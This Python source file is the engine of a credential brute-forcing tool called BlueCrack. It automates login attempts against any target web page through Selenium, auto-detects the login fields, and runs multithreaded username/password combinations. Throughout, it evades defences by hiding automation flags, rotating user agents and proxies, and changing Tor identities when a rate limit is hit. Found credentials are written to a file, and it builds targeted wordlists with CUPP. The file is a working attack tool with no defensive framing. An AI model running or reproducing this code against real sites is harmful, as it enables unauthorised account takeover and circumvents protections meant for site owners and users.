#!/usr/bin/env python3
"""
BlueCrack Engine — Core Selenium Attack Engine
================================================
Shared attack engine used by both the Flask web UI and CLI modes.
Encapsulates all Selenium-based brute-force logic, CUPP integration,
and sequence wordlist generation.
"""

import builtins
import json
import os
import random
import signal
import sys
import threading
import time
from datetime import datetime
from queue import Queue
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

from selenium import webdriver
from selenium.common.exceptions import (
    NoSuchElementException,
    TimeoutException,
    WebDriverException,
)
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False

# Optional: Tor IP shifting via stem
try:
    from stem import Signal as TorSignal
    from stem.control import Controller as TorController
    HAS_STEM = True
except ImportError:
    HAS_STEM = False


# ═══════════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════════
CSS_PATH_JS: str = """
function cssPath(el){
    if(!el) return null;
    var p=[];
    while(el.nodeType===1){
        var s=el.nodeName.toLowerCase();
        if(el.id){
            s+='#'+el.id;
            p.unshift(s);
            break;
        } else {
            var sib=el, n=1;
            while(sib=sib.previousElementSibling){
                if(sib.nodeName.toLowerCase()==s) n++;
            }
            if(n!=1) s+=':nth-of-type('+n+')';
        }
        p.unshift(s);
        el=el.parentNode;
    }
    return p.join(' > ');
}
return cssPath(arguments[0]);
"""

AUTO_DETECT_JS: str = """
window._autoFindFields = function() {
    let passwordField = document.querySelector('input[type="password"]');
    let userField = null;
    if (passwordField) {
        let inputs = Array.from(
            passwordField.form
                ? passwordField.form.querySelectorAll('input')
                : document.querySelectorAll('input')
        );
        for (let el of inputs) {
            if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
                userField = el;
                break;
            }
        }
    }
    let ucss = userField
        ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : ''))
        : null;
    let pcss = passwordField
        ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : ''))
        : null;
    return [ucss, pcss];
};
"""

CLICK_LISTENER_JS: str = """
document.addEventListener('click', function(e){ window._lastClicked = e.target; });
"""

DEFAULT_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

DEFAULT_LIMIT_TEXT: str = "too many requests"

# ANSI color helpers (for CLI output)
_GREEN = "\033[32m"
_RED = "\033[31m"
_YELLOW = "\033[33m"
_CYAN = "\033[36m"
_BLUE = "\033[34m"
_RESET = "\033[0m"
_BOLD = "\033[1m"


# ═══════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════
def print_banner() -> None:
    """Print the BlueCrack ASCII art banner."""
    try:
        print(
            """
\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
\033[34m██████╔╝███████╗╚██████╔╝███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
\033[34m╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
"""
        )
    except Exception:
        print("\n  === BLUECRACK — Advanced Browser Penetration Framework ===\n")


def change_tor_ip(control_port: int = 9051, password: Optional[str] = None) -> bool:
    """Request a new Tor identity (new IP).

    Args:
        control_port: Tor control port number.
        password: Optional authentication password for the Tor controller.

    Returns:
        True if identity was successfully changed, False otherwise.
    """
    if not HAS_STEM:
        return False
    try:
        with TorController.from_port(port=control_port) as ctrl:
            if password:
                ctrl.authenticate(password=password)
            else:
                ctrl.authenticate()
            ctrl.signal(TorSignal.NEWNYM)
            return True
    except Exception as e:
        print(f"{_RED}[-] Tor IP shift failed: {e}{_RESET}")
        return False


def build_chrome_options(ctx: Dict[str, Any]) -> webdriver.ChromeOptions:
    """Build ChromeOptions from the given context dictionary.

    Args:
        ctx: Configuration dictionary with keys like 'headless', 'use_tor', 'proxies', etc.

    Returns:
        Configured ChromeOptions instance.
    """
    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument(f"user-agent={random.choice(DEFAULT_USER_AGENTS)}")

    if ctx.get("use_tor"):
        options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
    elif ctx.get("proxies"):
        options.add_argument(f"--proxy-server={random.choice(ctx['proxies'])}")

    if ctx.get("headless"):
        options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920x1080")

    return options


def create_driver_safe(
    options: webdriver.ChromeOptions, max_retries: int = 3
) -> Optional[webdriver.Chrome]:
    """Create a Chrome WebDriver with retry logic.

    Args:
        options: Chrome options to use.
        max_retries: Maximum number of creation attempts.

    Returns:
        A Chrome WebDriver instance, or None if all retries failed.
    """
    for attempt in range(max_retries):
        try:
            wd = webdriver.Chrome(options=options)
            return wd
        except Exception as e:
            print(f"[-] WebDriver creation attempt {attempt+1} failed: {e}")
            if attempt < max_retries - 1:
                time.sleep(1)
            else:
                return None
    return None


def save_json_report(
    report_path: str,
    target_url: str,
    metrics: Dict[str, int],
    found_creds: List[Tuple[str, str]],
    start_time: float,
    end_time: float,
) -> None:
    """Save a JSON report of the attack results.

    Args:
        report_path: Output file path for the JSON report.
        target_url: The target URL that was tested.
        metrics: Dictionary of attack metrics.
        found_creds: List of (username, password) tuples found.
        start_time: Unix timestamp when attack started.
        end_time: Unix timestamp when attack ended.
    """
    report = {
        "target_url": target_url,
        "start_time": datetime.fromtimestamp(start_time).isoformat(),
        "end_time": datetime.fromtimestamp(end_time).isoformat(),
        "duration_seconds": round(end_time - start_time, 2),
        "metrics": metrics,
        "credentials_found": [{"username": u, "password": p} for u, p in found_creds],
    }
    try:
        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
# ATTACK ENGINE
# ═══════════════════════════════════════════════════════════════════
class AttackEngine:
    """Core brute-force attack engine powered by Selenium WebDriver.

    Encapsulates all attack state — queue, metrics, threads, stop flags —
    and provides callback-based event emission for use by any frontend
    (Flask/SocketIO, CLI, etc.).
    """

    def __init__(self) -> None:
        self._stop_flag: threading.Event = threading.Event()
        self._global_stop: threading.Event = threading.Event()
        self._found_event: threading.Event = threading.Event()
        self._start_time: float = 0.0
        self._running: bool = False
        self._attack_thread: Optional[threading.Thread] = None

        # Metrics
        self.metrics: Dict[str, int] = {}
        self._metrics_lock = threading.Lock()

        # Found credentials
        self._found_users: Set[str] = set()
        self._found_creds: List[Tuple[str, str]] = []
        self._found_lock = threading.Lock()

        # Logs buffer
        self._logs: List[str] = []
        self._logs_lock = threading.Lock()

        # Callbacks
        self._log_callback: Optional[Callable[[str], None]] = None
        self._progress_callback: Optional[Callable[[int, int], None]] = None
        self._metrics_callback: Optional[Callable[[Dict], None]] = None
        self._finished_callback: Optional[Callable[[bool, str], None]] = None

    @property
    def is_running(self) -> bool:
        return self._running

    def set_callbacks(
        self,
        log_cb: Optional[Callable[[str], None]] = None,
        progress_cb: Optional[Callable[[int, int], None]] = None,
        metrics_cb: Optional[Callable[[Dict], None]] = None,
        finished_cb: Optional[Callable[[bool, str], None]] = None,
    ) -> None:
        """Set callback functions for event notifications."""
        self._log_callback = log_cb
        self._progress_callback = progress_cb
        self._metrics_callback = metrics_cb
        self._finished_callback = finished_cb

    def _log(self, msg: str) -> None:
        """Emit a log message."""
        with self._logs_lock:
            self._logs.append(msg)
        if self._log_callback:
            self._log_callback(msg)

    def _emit_progress(self, current: int, total: int) -> None:
        """Emit progress update."""
        if self._progress_callback:
            self._progress_callback(current, total)

    def _build_metrics_snapshot(self) -> Dict[str, Any]:
        """Build the full metrics snapshot including speed, eta, and hits."""
        m = dict(self.metrics)
        elapsed = time.time() - self._start_time if self._start_time else 0
        m["elapsed"] = elapsed

        # Calculate speed (attempts per second)
        speed = 0.0
        if elapsed > 0:
            speed = self.metrics.get("attempted", 0) / elapsed
        m["speed"] = speed

        # Calculate ETA (seconds remaining)
        eta = 0
        total = getattr(self, "total", 0)
        if speed > 0 and total:
            left = total - self.metrics.get("attempted", 0)
            eta = left / speed
        m["eta"] = eta

        # Map successes to hits for frontend compatibility
        m["hits"] = self.metrics.get("successes", 0)
        return m

    def _emit_metrics(self) -> None:
        """Emit current metrics snapshot."""
        if self._metrics_callback:
            self._metrics_callback(self._build_metrics_snapshot())

    def get_metrics(self) -> Dict[str, Any]:
        """Return a copy of current metrics."""
        return self._build_metrics_snapshot()

    def get_logs(self) -> List[str]:
        """Return a copy of all log messages."""
        with self._logs_lock:
            return list(self._logs)

    def get_found_creds(self) -> List[Tuple[str, str]]:
        """Return a copy of found credentials."""
        with self._found_lock:
            return list(self._found_creds)

    def stop(self) -> None:
        """Request graceful stop of the attack."""
        self._stop_flag.set()
        self._global_stop.set()

    def start(self, ctx: Dict[str, Any]) -> None:
        """Start the attack in a background thread.

        Args:
            ctx: Configuration dictionary containing target_url, users, passwords,
                 threads, delay, jitter, error_msg, success_msg, etc.
        """
        if self._running:
            self._log("[!] Attack already running.")
            return

        # Reset state
        self._stop_flag.clear()
        self._global_stop.clear()
        self._found_event.clear()
        self._found_users.clear()
        self._found_creds.clear()
        self._logs.clear()
        self._running = True
        self._start_time = time.time()
        self.total = len(ctx.get("users", [])) * len(ctx.get("passwords", []))

        self.metrics = {
            "attempted": 0,
            "successes": 0,
            "failures": 0,
            "errors": 0,
            "rate_limit_hits": 0,
            "skipped_empty": 0,
            "skipped_solved_user": 0,
            "requeued": 0,
            "rate_retry_exhausted": 0,
        }

        self._attack_thread = threading.Thread(
            target=self._run_attack, args=(ctx,), daemon=True
        )
        self._attack_thread.start()

    def _run_attack(self, ctx: Dict[str, Any]) -> None:
        """Main attack loop — detect selectors then launch worker threads."""
        try:
            users: List[str] = ctx["users"]
            passwords: List[str] = ctx["passwords"]
            total: int = len(users) * len(passwords)
            done: List[int] = [0]
            multiple_users: bool = len(users) > 1
            success_msg: str = ctx.get("success_msg", "").lower().strip()
            max_attempts: int = ctx.get("max_attempts", 0)
            continue_after: bool = ctx.get("continue_after_success", False)

            # Retry budget
            retry_budget: Dict[Tuple[str, str], int] = {}
            retry_lock = threading.Lock()
            MAX_RETRIES_PER_COMBO: int = 3

            q: Queue = Queue(maxsize=1000)

            def populate() -> None:
                for u in users:
                    for p in passwords:
                        q.put((u, p))

            threading.Thread(target=populate, daemon=True).start()

            # Setup driver for selector detection
            self._log("[*] Opening browser for selector setup...")
            setup_driver = create_driver_safe(webdriver.ChromeOptions())
            if setup_driver is None:
                self._log("[-] Failed to create setup browser.")
                if self._finished_callback:
                    self._finished_callback(False, "Failed to create setup browser.")
                return

            try:
                setup_driver.get(ctx["target_url"])
                time.sleep(2)
                setup_driver.execute_script(CLICK_LISTENER_JS)
                setup_driver.execute_script(AUTO_DETECT_JS)
                detected = setup_driver.execute_script(
                    "return window._autoFindFields();"
                )

                if detected and detected[0] and detected[1]:
                    ctx["username_selector"], ctx["password_selector"] = detected
                    self._log(f"[+] Auto-detected  User: {detected[0]}")
                    self._log(f"[+] Auto-detected  Pass: {detected[1]}")
                else:
                    self._log("[-] Auto-detect failed. Using keyboard fallback...")
                    self._log("    Click username field → press S")
                    self._log("    Click password field → press T")
                    if HAS_KEYBOARD:
                        while not (
                            ctx.get("username_selector")
                            and ctx.get("password_selector")
                        ):
                            if self._stop_flag.is_set():
                                setup_driver.quit()
                                if self._finished_callback:
                                    self._finished_callback(
                                        False, "Stopped by user."
                                    )
                                return
                            if keyboard.is_pressed("s"):
                                elem = setup_driver.execute_script(
                                    "return window._lastClicked"
                                )
                                if elem:
                                    css = setup_driver.execute_script(
                                        CSS_PATH_JS, elem
                                    )
                                    if css:
                                        ctx["username_selector"] = css
                                        self._log(f"[+] Username LOCKED: {css}")
                                time.sleep(0.3)
                            if keyboard.is_pressed("t"):
                                elem = setup_driver.execute_script(
                                    "return window._lastClicked"
                                )
                                if elem:
                                    css = setup_driver.execute_script(
                                        CSS_PATH_JS, elem
                                    )
                                    if css:
                                        ctx["password_selector"] = css
                                        self._log(f"[+] Password LOCKED: {css}")
                                time.sleep(0.3)
                            time.sleep(0.1)
                    else:
                        self._log("[-] keyboard module not available for manual selection.")
                        if self._finished_callback:
                            self._finished_callback(
                                False, "Auto-detect failed and keyboard module unavailable."
                            )
                        try:
                            setup_driver.quit()
                        except Exception:
                            pass
                        return
            except Exception as e:
                self._log(f"[-] Setup error: {e}")
                try:
                    setup_driver.quit()
                except Exception:
                    pass
                if self._finished_callback:
                    self._finished_callback(False, str(e))
                return
            try:
                setup_driver.quit()
            except Exception:
                pass

            self._log(f"[*] Launching {ctx['threads']} worker thread(s)...")

            def _run_worker() -> None:
                options = build_chrome_options(ctx)
                wd = create_driver_safe(options)
                if wd is None:
                    self._log(
                        "[-] Thread startup error: could not create WebDriver"
                    )
                    return

                tor_counter: int = 0
                try:
                    while (
                        not q.empty()
                        and not self._stop_flag.is_set()
                        and not self._global_stop.is_set()
                    ):
                        # Check max attempts
                        if max_attempts > 0:
                            with self._metrics_lock:
                                if self.metrics["attempted"] >= max_attempts:
                                    break

                        if not continue_after:
                            if not multiple_users and self._found_users:
                                break

                        try:
                            user, pwd = q.get(timeout=1)
                        except Exception:
                            break

                        if not pwd or not pwd.strip():
                            with self._metrics_lock:
                                self.metrics["skipped_empty"] += 1
                            q.task_done()
                            continue

                        if not continue_after and user in self._found_users:
                            with self._metrics_lock:
                                self.metrics["skipped_solved_user"] += 1
                            done[0] += 1
                            self._emit_progress(done[0], total)
                            q.task_done()
                            continue

                        tor_counter += 1
                        if (
                            ctx.get("use_tor")
                            and ctx.get("tor_shift_every", 0) > 0
                            and tor_counter % ctx["tor_shift_every"] == 0
                        ):
                            self._log("[~] Shifting Tor IP...")
                            change_tor_ip(ctx.get("tor_port", 9051))
                            time.sleep(2)

                        try:
                            delay = ctx.get("delay", 0)
                            jitter = ctx.get("jitter", 0)
                            if jitter > 0:
                                delay += random.uniform(0, jitter)
                            if delay > 0:
                                time.sleep(delay)

                            wd.get(ctx["target_url"])
                            wait = WebDriverWait(wd, 5)
                            u_el = wait.until(
                                EC.presence_of_element_located(
                                    (By.CSS_SELECTOR, ctx["username_selector"])
                                )
                            )
                            p_el = wait.until(
                                EC.presence_of_element_located(
                                    (By.CSS_SELECTOR, ctx["password_selector"])
                                )
                            )

                            u_el.clear()
                            u_el.send_keys(user)
                            p_el.clear()
                            p_el.send_keys(pwd)
                            p_el.send_keys(Keys.ENTER)

                            with self._metrics_lock:
                                self.metrics["attempted"] += 1

                            self._log(f"[*] Trying: {user} / {pwd}")
                            time.sleep(1)

                            src = ""
                            try:
                                src = wd.page_source.lower()
                            except Exception:
                                pass

                            current_url = ""
                            try:
                                current_url = wd.current_url
                            except Exception:
                                pass

                            # Rate limit check
                            if (
                                ctx.get("limit_text")
                                and ctx["limit_text"] in src
                            ):
                                self._log("[!] Rate limit hit!")
                                with self._metrics_lock:
                                    self.metrics["rate_limit_hits"] += 1

                                combo_key = (user, pwd)
                                with retry_lock:
                                    retry_budget[combo_key] = (
                                        retry_budget.get(combo_key, 0) + 1
                                    )
                                    budget_exceeded = (
                                        retry_budget[combo_key]
                                        > MAX_RETRIES_PER_COMBO
                                    )

                                if budget_exceeded:
                                    self._log(
                                        f"[!] Retry budget exhausted for {user}/{pwd}"
                                    )
                                    with self._metrics_lock:
                                        self.metrics["rate_retry_exhausted"] += 1
                                    done[0] += 1
                                    self._emit_progress(done[0], total)
                                    q.task_done()
                                    continue

                                if ctx.get("use_tor"):
                                    change_tor_ip(ctx.get("tor_port", 9051))
                                    time.sleep(3)
                                elif ctx.get("cooldown", 0) > 0:
                                    time.sleep(ctx["cooldown"])

                                q.put((user, pwd))
                                with self._metrics_lock:
                                    self.metrics["requeued"] += 1
                                q.task_done()
                                self._emit_metrics()
                                continue

                            # Error text check
                            if (
                                ctx.get("error_msg")
                                and ctx["error_msg"] in src
                            ):
                                with self._metrics_lock:
                                    self.metrics["failures"] += 1
                                done[0] += 1
                                self._emit_progress(done[0], total)
                                q.task_done()
                                self._emit_metrics()
                                continue

                            # Determine success
                            is_success = False
                            if success_msg:
                                if success_msg in src:
                                    is_success = True
                            elif (
                                current_url
                                and current_url != ctx["target_url"]
                                and "login" not in current_url.lower()
                            ):
                                is_success = True
                            elif ctx.get("error_msg"):
                                is_success = True

                            if is_success:
                                with self._found_lock:
                                    self._found_users.add(user)
                                    self._found_creds.append((user, pwd))
                                self._log(
                                    f"\n[+] VALID CREDENTIALS: {user} / {pwd}"
                                )
                                with self._metrics_lock:
                                    self.metrics["successes"] += 1
                                try:
                                    with open(
                                        "credentials.txt", "a", encoding="utf-8"
                                    ) as cf:
                                        cf.write(
                                            f"{ctx['target_url']} - {user}:{pwd}\n"
                                        )
                                except Exception:
                                    pass

                                done[0] += 1
                                self._emit_progress(done[0], total)
                                q.task_done()
                                self._emit_metrics()

                                if not continue_after and not multiple_users:
                                    with q.mutex:
                                        q.queue.clear()
                                    break

                                # Restart browser for clean state
                                try:
                                    wd.quit()
                                except Exception:
                                    pass
                                wd = create_driver_safe(options)
                                if wd is None:
                                    self._log(
                                        "[-] Could not restart browser after success"
                                    )
                                    break
                                continue
                            else:
                                with self._metrics_lock:
                                    self.metrics["failures"] += 1

                            done[0] += 1
                            self._emit_progress(done[0], total)
                            q.task_done()
                            self._emit_metrics()

                        except (NoSuchElementException, TimeoutException):
                            self._log(
                                f"[-] Missing elements for {user}, retrying..."
                            )
                            combo_key = (user, pwd)
                            with retry_lock:
                                retry_budget[combo_key] = (
                                    retry_budget.get(combo_key, 0) + 1
                                )
                                budget_exceeded = (
                                    retry_budget[combo_key]
                                    > MAX_RETRIES_PER_COMBO
                                )

                            if not budget_exceeded:
                                q.put((user, pwd))
                                with self._metrics_lock:
                                    self.metrics["requeued"] += 1
                            else:
                                with self._metrics_lock:
                                    self.metrics["rate_retry_exhausted"] += 1
                                done[0] += 1
                                self._emit_progress(done[0], total)

                            q.task_done()
                            with self._metrics_lock:
                                self.metrics["errors"] += 1
                            try:
                                wd.quit()
                            except Exception:
                                pass
                            wd = create_driver_safe(options)
                            if wd is None:
                                self._log(
                                    "[-] Could not recreate browser, thread exiting"
                                )
                                break

                        except Exception as e:
                            combo_key = (user, pwd)
                            with retry_lock:
                                retry_budget[combo_key] = (
                                    retry_budget.get(combo_key, 0) + 1
                                )
                                budget_exceeded = (
                                    retry_budget[combo_key]
                                    > MAX_RETRIES_PER_COMBO
                                )

                            if not budget_exceeded:
                                q.put((user, pwd))
                                with self._metrics_lock:
                                    self.metrics["requeued"] += 1
                            else:
                                with self._metrics_lock:
                                    self.metrics["rate_retry_exhausted"] += 1
                                done[0] += 1
                                self._emit_progress(done[0], total)

                            q.task_done()
                            msg = str(e).lower()
                            if not any(
                                k in msg
                                for k in (
                                    "invalid session id",
                                    "detached",
                                    "out of memory",
                                    "no such window",
                                )
                            ):
                                self._log(f"[-] Error trying {user}: {e}")
                            with self._metrics_lock:
                                self.metrics["errors"] += 1
                            try:
                                wd.quit()
                            except Exception:
                                pass
                            wd = create_driver_safe(options)
                            if wd is None:
                                self._log(
                                    "[-] Could not recreate browser, thread exiting"
                                )
                                break
                finally:
                    try:
                        if wd:
                            wd.quit()
                    except Exception:
                        pass

            threads_list: List[threading.Thread] = []
            for _ in range(ctx["threads"]):
                t = threading.Thread(target=_run_worker, daemon=True)
                t.start()
                threads_list.append(t)
            for t in threads_list:
                t.join()

            end_time = time.time()
            self._emit_metrics()

            # Auto-save JSON report
            save_json_report(
                "bluecrack_report.json",
                ctx["target_url"],
                self.metrics,
                self._found_creds,
                self._start_time,
                end_time,
            )

            if self._found_users:
                saved_msg = f"Valid credentials found for {len(self._found_users)} user(s)! Saved to credentials.txt"
                if self._finished_callback:
                    self._finished_callback(True, saved_msg)
            elif self._stop_flag.is_set() or self._global_stop.is_set():
                if self._finished_callback:
                    self._finished_callback(False, "Stopped by user.")
            else:
                if self._finished_callback:
                    self._finished_callback(False, "No valid credentials found.")

        finally:
            self._running = False


# ═══════════════════════════════════════════════════════════════════
# CUPP WORDLIST GENERATOR
# ═══════════════════════════════════════════════════════════════════
def generate_cupp_wordlist(
    profile: Dict[str, Any],
    log_callback: Optional[Callable[[str], None]] = None,
) -> str:
    """Generate a CUPP wordlist from the given profile.

    Args:
        profile: Dictionary with CUPP profile fields (name, surname, etc.).
        log_callback: Optional callback for log messages.

    Returns:
        Absolute path to the generated wordlist file, or empty string on failure.
    """
    _cupp_dir = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, _cupp_dir)
    try:
        import cupp as _cupp_mod
    except ImportError:
        if log_callback:
            log_callback("[-] cupp.py not found in directory.")
        return ""

    try:
        _cupp_mod.read_config(os.path.join(_cupp_dir, "cupp.cfg"))
        if log_callback:
            log_callback("[*] Generating CUPP wordlist...")

        profile.setdefault("spechars1", "n")
        profile.setdefault("randnum", "n")
        profile.setdefault("leetmode", "n")

        # Mock builtins.input to prevent CUPP from hanging
        original_input = builtins.input
        builtins.input = lambda prompt="": "n"
        try:
            _cupp_mod.generate_wordlist_from_profile(profile)
        finally:
            builtins.input = original_input

        outfile = profile["name"] + ".txt"
        if os.path.exists(outfile):
            with open(outfile) as f:
                cnt = sum(1 for _ in f)
            if log_callback:
                log_callback(f"[+] CUPP done! {cnt} passwords → {outfile}")
            return os.path.abspath(outfile)
        else:
            if log_callback:
                log_callback("[-] CUPP generated no output.")
            return ""
    except Exception as e:
        if log_callback:
            log_callback(f"[-] CUPP error: {e}")
        return ""


# ═══════════════════════════════════════════════════════════════════
# SEQUENCE WORDLIST GENERATOR
# ═══════════════════════════════════════════════════════════════════
def generate_sequence_wordlist(
    start: int,
    end: int,
    prefix: str = "",
    suffix: str = "",
    pad_width: int = 0,
    output_path: str = "sequence_wordlist.txt",
    log_callback: Optional[Callable[[str], None]] = None,
) -> str:
    """Generate a numeric/pattern-based wordlist.

    Args:
        start: Starting number.
        end: Ending number (inclusive).
        prefix: String prefix for each entry.
        suffix: String suffix for each entry.
        pad_width: Zero-padding width (0 = no padding).
        output_path: Output file path.
        log_callback: Optional callback for log messages.

    Returns:
        Absolute path to the generated file, or empty string on failure.
    """
    try:
        if start > end:
            start, end = end, start

        count = end - start + 1
        if log_callback:
            log_callback(f"[*] Generating {count} sequence passwords...")

        with open(output_path, "w", encoding="utf-8") as f:
            for num in range(start, end + 1):
                num_str = str(num).zfill(pad_width) if pad_width > 0 else str(num)
                f.write(f"{prefix}{num_str}{suffix}\n")

        if log_callback:
            log_callback(
                f"[+] Sequence wordlist generated! ({count} passwords) → {output_path}"
            )
        return os.path.abspath(output_path)
    except Exception as e:
        if log_callback:
            log_callback(f"[-] Sequence generation error: {e}")
        return ""
